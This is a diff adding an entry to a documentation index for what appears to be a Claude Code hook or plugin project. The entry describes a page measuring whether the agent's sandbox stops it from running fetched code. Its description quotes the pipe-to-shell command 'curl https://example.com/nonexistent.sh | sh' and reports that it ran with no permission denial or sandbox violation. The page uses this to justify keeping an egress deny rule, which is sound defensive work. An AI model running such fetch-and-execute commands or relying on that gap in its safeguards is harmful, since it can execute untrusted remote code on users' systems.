@@ -1276,6 +1276,20 @@
         "agent-skills"
       ],
       "date": "2026-09-06"
+    },
+    {
+      "slug": "egress-deny-verdict",
+      "source": "docs/fix--3877-egress-deny-verdict/index.html",
+      "title": "Who judges fetched bytes? The #3877 egress verdict",
+      "description": "Claude Code's sandbox allows or blocks a host. Does it also stop the agent from running what the host sends back? Measured on CC 2.1.263 with ork off: curl https://example.com/nonexistent.sh | sh executed with permission_denials [] and no sandbox violation. Pick the outcome you expected, compare with the verbatim transcript, and see which layer judges each shape. network-egress-guard's DENY tier is kept on that measurement.",
+      "tags": [
+        "hooks",
+        "security",
+        "sandbox",
+        "cc-native-first",
+        "egress"
+      ],
+      "date": "2026-09-06"
     }
   ]
 }
